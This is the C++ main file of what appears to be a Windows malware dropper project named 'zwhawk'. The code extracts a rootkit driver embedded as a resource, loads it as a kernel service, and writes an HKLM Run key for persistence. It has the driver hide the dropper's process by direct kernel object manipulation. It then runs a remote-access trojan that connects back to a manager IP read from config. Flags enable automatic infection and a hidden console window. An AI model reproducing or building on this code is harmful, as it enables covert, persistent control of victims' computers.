// dropper.cpp : Defines the entry point for the console application.

/*
	Dropper is the main file for dropper activities
*/
#include "stdafx.h"
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <fstream>
#include "Shlwapi.h"
#include "stdlib.h"

#include "json.hpp"
#include "DriverHandler.h"
#include "RegistryHandler.h"
#include "ResourceHandler.h"
#include "ServicesHandler.h"
#include "RatHandler.h"
#include "common.h"

// Winsock Library file 
#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 512

#define DEFAULT_LOCAL_PORT 27185
#define DEFAULT_REMOTE_PORT 27186
// Manual Mode enables CLI control over the dropper
//#define MANUAL_MODE

// Automate Attack disables CLI control over the dropper and infects
// the victim automatically
//#define AUTOMATE_ATTACK

// Hide Windows will hide the window 
//#define IS_HIDE_WINDOW

// Automate Inject will create the injection tool for the driver encapsulation
// as a resource to the dropper
//#define INJECT_RESOURCE

// nlohmann namespace used in JSON library
using namespace nlohmann;


// DeviceType (reserved for use 32768-65535)
#define SIOCTL_TYPE 40000

// This macro is used to create a unique system I/O control code (IOCTL).
// Method Buffered means we send a buffer as in irp->AssociatedIrp.SystemBuffer

// Send input and receive "Hello World!" from Driver
#define IOCTL_BASIC CTL_CODE( SIOCTL_TYPE, 0x800, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA) 
// Echo from Driver
#define IOCTL_ECHO CTL_CODE( SIOCTL_TYPE, 0x801, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
// Send PID and driver hides it using dkom technique
#define IOCTL_DKOMPSHIDE CTL_CODE( SIOCTL_TYPE, 0x802, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)


int main(int argc, char* argv[]) {
	// Object for resources handling
	ResourceHandler zwResourceHandler = ResourceHandler();
	// Object for Services handling
	ServicesHandler zwServicesHandler = ServicesHandler();
	// Object for Registry handling
	RegistryHandler zwRegistryHandler = RegistryHandler();
	// Object for Driver handling
	DriverHandler zwDriverHandler = DriverHandler();

	// argv[0] is executable path
	printf("Running: %s\n", argv[0]);

	#ifdef IS_HIDE_WINDOW
	//
	// Retrieves the window handle used by the console associated with the calling process.
	HWND currentWindow = GetConsoleWindow();
	// Sets the specified window's show state.
	if (!(ShowWindow(currentWindow, SW_HIDE))) {
		printf("HIDE_WINDOW - HIDE_WINDOW failed (%Iu)\n", GetLastError());
		printf("Failed to hide window!\n");
	}
	CloseHandle(currentWindow);
	#endif

	#ifdef AUTOMATE_ATTACK
	wchar_t *pathfileName = GetWC(argv[0]);
	// get file name from path
	wchar_t *fileName = PathFindFileName(pathfileName);

	// open configuration file
	std::ifstream configuration_file("config.json");
	if (!configuration_file.is_open()) {
		printf("couldn't load config.json\n");
		return 1;
	}

	// use json to parse configuration file content
	json configuration = json::parse(configuration_file);
	std::cout << configuration.dump() << std::endl;
	
	// rootkit_filename is the name of the resource that contains the driver
	std::string rootkit_filename = configuration["rootkit"]["name"].get<std::string>();
	wchar_t *rootkit_name = GetWC(rootkit_filename.c_str());

	// try to connect to driver, the driver may already been loaded and started at boot
	HANDLE hDriver = zwDriverHandler.connect_driver(rootkit_name);
	if (!(hDriver)) {

		// if driver isn't running we check if the driver resource exist
		if (!(zwResourceHandler.is_exist(fileName, rootkit_name))) {
			// if the resource wasn't found we exit
			printf("Couldn't find rootkit!\n");
			// getchar();
			exit(1);
		}
		// if the resource was found we decapsulate it into a seperate file
		zwResourceHandler.decapsulation(fileName, rootkit_name);
		
		// load the driver using service control manager and creating auto start 
		// key at registry for the driver at boot
		zwServicesHandler.load_kernel_code_scm(rootkit_name);

		// connect to driver using a symbolic link created by the driver (IoCreateSymbolicLink)
		hDriver = zwDriverHandler.connect_driver(rootkit_name);
		if (!(hDriver)) {
			printf("Couldn't load rootkit!\n");
			exit(1);
			
		}
	}
	printf("Loaded rootkit!\n");

	
	wchar_t *path_autorun_exe = GetWC("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	// create an auto start key at registry for exe at boot
	HKEY key_autorun_exeLM = zwRegistryHandler.OpenKey(HKEY_LOCAL_MACHINE, path_autorun_exe);
	//HKEY key_autorun_exeCU = zwRegistryHandler.OpenKey(HKEY_CURRENT_USER, path_autorun_exe);
	free(path_autorun_exe);
	wchar_t *name_key_autorun_exe = GetWC("dropper");
	// set an auto start key at registry for path of dropper
	zwRegistryHandler.SetVal(key_autorun_exeLM, name_key_autorun_exe, pathfileName);
	//zwRegistryHandler.SetVal(key_autorun_exeCU, name_key_autorun_exe, pathfileName);
	free(name_key_autorun_exe);

	// Retrieves the process identifier of the calling process.
	DWORD current_process_id = GetCurrentProcessId();	 
	char* pid_string = new char[16];
	// Convert an unsigned long integer to a string. 
	_ultoa_s(current_process_id, pid_string, 16, 10);
	
	// Request from driver to hide process with specified PID
	zwDriverHandler.handle_hideprocess(hDriver, pid_string);
	printf("YEAH!\n");
	free(rootkit_name);
	#endif

	// Retrieves a handle to the specified standard device
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	// Change std_output text color to red
	SetConsoleTextAttribute(hConsole, (FOREGROUND_RED));
	printf("Welcome to the server-RAT!\n");
	// Initialize Winsock
	RatHandler::InitWSA();
	// Object for Rat handling
	char* remote_ip = (char*)calloc(256, sizeof(char));


	std::ifstream configuration_file("config.json");
	if (!configuration_file.is_open()) {
		printf("couldn't load config.json\n");
		return 1;
	}

	// use json to parse configuration file content
	json configuration = json::parse(configuration_file);



	std::string manager_ip = configuration["dropper"]["manager"].get<std::string>();
	memcpy(remote_ip, manager_ip.c_str(), manager_ip.length());
	//memcpy(remote_ip, "192.168.1.26", 256);
	RatHandler sserver = RatHandler(remote_ip, 256, DEFAULT_REMOTE_PORT);
	sserver.runRatClient();
	sserver.runRatServer(DEFAULT_LOCAL_PORT);
	//sserver.hDriver = &hDriver;
	//sserver.hDriverHandler = &zwDriverHandler;
	sserver.acceptConnection();

	//CloseHandle(hDriver);
	while (1) {
		getchar();
	}
	#ifdef INJECT_RESOURCE
	std::ifstream configuration_file("config.json");
	if (!configuration_file.is_open()) {
		printf("couldn't load config.json\n");
		return 1;
	}
	json configuration = json::parse(configuration_file);
	std::cout << configuration.dump() << std::endl;
	std::string rootkit_filename = configuration["rootkit"]["name"].get<std::string>();
	std::string dropper_filename = configuration["dropper"]["name"].get<std::string>();
	wchar_t *rootkit_name = GetWC(rootkit_filename.c_str());
	wchar_t *dropper_name = GetWC(dropper_filename.c_str());
	if (!(zwResourceHandler.is_exist(dropper_name, rootkit_name))) {
		zwResourceHandler.encapsulation(dropper_name, rootkit_name);
		getchar();
		exit(1);
	}
	printf("Already loaded!\n");
	free(dropper_name);
	free(rootkit_name);
	getchar();
	#endif

	#ifdef MANUAL_MODE
	printf("               _                    _    \n");
	printf("              | |                  | |   \n");
	printf(" ______      _| |__   __ ___      _| | __\n");
	printf("|_  /\\ \\ /\\ / / '_ \\ / _` \\ \\ /\\ / / |/ /\n");
	printf(" / /  \\ V  V /| | | | (_| |\\ V  V /|   < \n");
	printf("/___|  \\_/\\_/ |_| |_|\\__,_| \\_/\\_/ |_|\\_\\\n\n");

	unsigned int option; // Default option
	char *driver_name = (char*)malloc(sizeof(char) * 128);
	char *dropper_name = (char*)malloc(sizeof(char) * 128);
	while (1) {
		printf("\nEnter an option:\n");
		printf("0) Connect to driver\n");
		printf("1) Load driver\n");
		printf("2) Unload driver\n");
		printf("3) Encapsulate driver to EXE\n");
		printf("4) Decapsulate driver from EXE\n");
		scanf_s("%u", &option);

		if (option == 0) {
			printf("\nConnect to driver\n");
			printf("Enter driver name:");
			scanf_s("%s", driver_name, 128);
			if (!(connect_driver(driver_name))) {
				printf("\nmain - connect_driver failed (%Iu)\n", GetLastError());
			}
			else {
				printf("\nmain - connect_driver success\n");
			}
		}

		if (option == 1) {
			printf("\nLoad driver\n");
			printf("Enter driver name:");
			scanf_s("%s", driver_name, 128);
			if (!(load_kernel_code_scm(driver_name))) {
				printf("\nmain - load_kernel_code_scm failed (%Iu)\n", GetLastError());
			}
			else {
				printf("\nmain - load_kernel_code_scm success\n");
			}
		}

		if (option == 2) {
			printf("\nUnload driver\n");
			printf("Enter driver name:");
			scanf_s("%s", driver_name, 128);
			if (!(unload_kernel_code_scm(driver_name))) {
				printf("\nmain - unload_kernel_code_scm failed (%Iu)\n", GetLastError());
			}
			else {
				printf("\nmain - unload_kernel_code_scm success\n");
			}
		}

		if (option == 3) {
			printf("\nEncapsulate driver to EXE\n");
			printf("Enter driver name:");
			scanf_s("%s", driver_name, 128);
			printf("Enter dropper name:");
			scanf_s("%s", dropper_name, 128);
			if (!(encapsulation(dropper_name, driver_name))) {
				printf("\nmain - encapsulation failed (%Iu)\n", GetLastError());
			}
			else {
				printf("\nmain - encapsulation success\n");
			}
		}

		if (option == 4) {
			printf("\nDecapsulate driver from EXE\n");
			printf("Enter driver name:");
			scanf_s("%s", driver_name, 128);
			printf("Enter dropper name:");
			scanf_s("%s", dropper_name, 128);
			if (!(decapsulation(dropper_name, driver_name))) {
				printf("\nmain - decapsulation failed (%Iu)\n", GetLastError());
			}
			else {
				printf("\nmain - decapsulation success\n");
			}
		}

	}
	#endif

}
